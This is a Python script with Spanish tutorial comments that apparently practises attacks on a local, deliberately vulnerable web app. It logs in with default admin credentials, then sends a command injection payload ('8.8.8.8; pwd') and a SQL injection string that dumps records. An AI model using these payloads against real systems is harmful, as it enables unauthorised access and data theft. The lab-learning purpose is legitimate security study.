import re
import requests

# Se instala de la siguiete manera:
# python -m pip install beatifulsoup4

# Esta es la forma en que se importa
from bs4 import BeautifulSoup 

# Se necesita hacer una peticion a la URL
# Donde esta -----> Es el aplicativo web que se instala en docker.
url = 'http://localhost:8083/login.php' 

# Lo que se busca es el USER_TOKEN
# Se crea una funcion y le pasa el Source
# Ya se que se trata de una sopa de beatifulsoup
def get_token(source):
    # Se le indica a la libreria de Beatifulsoup el contenido y el parser que se desea utilizar. Esa es la sopa
    # Esta libreria depende de un parser, el mas utilizado es LXML porque soporta varios formatos
    # Se puede probar html.parser
    soup = BeautifulSoup(source, "html.parser") 
    # Para el token se busca un input de tipo hidden y el valor.
    return soup.find('input',{'type':'hidden'})['value']

# Se cre un objeto de session para dejarlo en una variable
session = requests.Session()

#----------------- LOGIN --------------
# Lo que se busca es el source dentro del session
src = session.get(url).text

# Despues del login lo que se hace es ejecutar la explotacion de las vulnerabilidades.
# Se coje el token
token = get_token(src)
# Las cookies tambien porque se necesitan mas adelante
cookies = session.cookies.get_dict()

#print(token)
#print(str(cookies))

# Ahora que se tiene el token, se obtienen las credenciales
    # -------- USER -PSW ---------------
    # Ahora se envia un diccionario (clave,valor) con la information del formulario
    # En wireshark se puede verificar donde estan los elementos fundamentales para realizar la peticion de tipo post.
credentials = {
        'username':'admin',
        'password':'password',
        'Login':'Login',
        # Como se recoje el token con la funcion ,se le pasa el source
        'user_token':token

}
    
# Ahora se coje el login 
responseLogin = session.post(url=url, data = credentials)

# Se crea una funcion para los resultados del login y se le pasa el Source
def findLoginResult(source):
    # Se le indica a la libreria de Beatifulsoup el contenido y el parser que se desea utilizar. Esa es la sopa
    # Esta libreria depende de un parser, el mas utilizado es LXML porque soporta varios formatos
    # Se puede probar html.parser
    soup = BeautifulSoup(source, "html.parser") 
    # Para el valor que se esta buscando es un DIV 
    # Se utiliza un find ALL para ver todos los DIVS del codigo html cuya clase sea MESSAGE
    # Porque lo que se quiere hacer es ver el mensaje que de: logueado como administrador.
    # Esto devuelve una lista
    result = soup.find_all('div', {'class':'message'})

    # Entonces se tiene que sacar la posicion numero 1 de la lista
    return result[0].string
    
print(findLoginResult(responseLogin.text))

#--------------------------------------------
#-----------------  OS INYECTIONS --------------
#--------------------------------------------

print('OS inyection')
print(20*'-')

# Esto sera una peticion de tipo POST
# Se le tiene que pasar la IP y el boton de SUBMIT
# Esto es n diccionario clave valor
postData ={
    # Aqui se pone la IP despues lo que se le quiere concatener
    'IP':'8.8.8.8; pwd',
    'Submit': 'Submit'
    }
# Cuando ya se tienen los datos para realizar la peticion 
#  falta solo saber a que URL le se le van a enviar estos datos
# Como se puede saber?
# Se revisa el paquete de POST que sale en WIRESHARK
# Tambien si se hace click sobre Command Inyection en el aplicativo web, en el URL se podra obtener tambien
urlCommandOSInjection = 'http://localhost:8083/vulnerabilities/exec/'

# Ahora se envia el POST
# Se necesita no solo los datos sino las cokkies que se obtuvieron antes en la variable cookies, y los datos
# Se necesitan las cookies porque esta maquina vulnerable tiene 4 tipos de dificultad
# En la cookies de session se le indica lo que se tiene configurado
# Si no se le indica no lo recoje
responseCommandOSInjection = session.post(urlCommandOSInjection, cookies=cookies, data=postData)


# Deberia de salir en el HTML pero a mi no me esta saliendo
print(responseCommandOSInjection.text)


# Metodo que saque esa parte de la respuesta
def findOSResult(source):
    # Se le indica a la libreria de Beatifulsoup el contenido y el parser que se desea utilizar. Esa es la sopa
    # Esta libreria depende de un parser, el mas utilizado es LXML porque soporta varios formatos
    # Se puede probar html.parser
    soup = BeautifulSoup(source, "html.parser") 
    # Para el valor que se busca es un PRE 
    # Se usa un find ALL para ver todos los PRE del codigo html
    result = soup.find_all('pre')
    return result[0].string

print(findOSResult(responseCommandOSInjection.text))

#--------------------------------------------
#----------------- SQL INYECTIONS -----------
#--------------------------------------------
print()
print('OS inyection')
print(50*'-')

# Primero se necesita pasar el URL del aplicativo web, 
# Se hace click en SQL INjection y copio el URL
# SOlo se agrega el BASE URL porque los parametros se agregan manualmente.


# Aqui la idea es enga;ar al sistema para poder meter otros parametros.
# Entonces en lugar de cerrar la sentencia SQL se ESCAPA para que quede abierta
# La ultima comilla del cero NO se cierra
# Este parametro se le pasa a la ruta bajo el parametro ID
sqli =  "id=%' or '0' = '0"

# Ahora se necesita el boton de submit
submit = "&Submit=Submit#"

urlCommandSQLi = 'http://localhost:8083/vulnerabilities/sqli/?'+ sqli + submit

# Ahora solo se necesita hacer una request con la session
# Se le pasa la cookie tambien.

responseCommandSQLi = session.get(urlCommandSQLi, cookies=cookies)


sqliText = responseCommandSQLi.text
print(sqliText)

def findSQLiResult(source):
    # Se le indica a la libreria de Beatifulsoup el contenido y el parser que se desea utilizar. Esa es la sopa
    # Esta libreria depende de un parser, el mas utilizado es LXML porque soporta varios formatos
    # Se puede probar html.parser
    soup = BeautifulSoup(source, "html.parser") 
    # Para el valor que se busca es un PRE 
    # Se utiliza un find ALL para ver todos los PRE del codigo html
    result = soup.find_all('pre')

    # Se devuelve un RESULT entero porque hay mas de una etiqueta PRE
    # Se tiene que recorrer cada una en el resultado, devuelpor lo que se devuelve todo el listado
    return result

# Aqui se recoje toda la lista de etiquetas PRE
sqliResult = findSQLiResult(sqliText)

print(sqliResult)

# Ahora se hace una funcion para recorrer los resultdos de la etiquetas.
def printSQLiResult(result):
    for r in result:
        print(r.text)

# Se le pasa como parametro el result que se obtuvo anteriormente.
printSQLiResult(sqliResult)